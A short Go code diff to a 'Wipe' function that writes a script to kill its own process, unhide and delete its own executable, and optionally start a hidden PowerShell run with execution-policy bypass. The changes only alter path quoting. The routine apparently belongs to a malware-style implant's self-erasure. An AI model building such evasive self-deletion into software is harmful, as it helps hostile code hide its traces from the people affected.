@@ -22,7 +22,7 @@ func Wipe(secure bool) {
 	var wipe strings.Builder
 	wipe.WriteString("sleep 1\n")
 	fmt.Fprintf(&wipe, "kill -Id %d -Force\n", os.Getpid())
-	fmt.Fprintf(&wipe, "attrib -h -s \"%s\"\n", store.ExecPath)
+	fmt.Fprintf(&wipe, "attrib -h -s %q\n", store.ExecPath)
 	fmt.Fprintf(&wipe, "rm -fo '%s'\n", store.ExecPath)
 
 	if secure {
@@ -40,7 +40,7 @@ func Wipe(secure bool) {
 			return
 		}
 
-		fmt.Fprintf(&wipe, "start powershell -Args '-nop -w hidden -ep bypass -file \"%s\"' -w hidden\n", cipherPath)
+		fmt.Fprintf(&wipe, "start powershell -Args '-nop -w hidden -ep bypass -file %q' -w hidden\n", cipherPath)
 	}
 
 	wipeName := fmt.Sprintf("%d.ps1", time.Now().UnixNano())
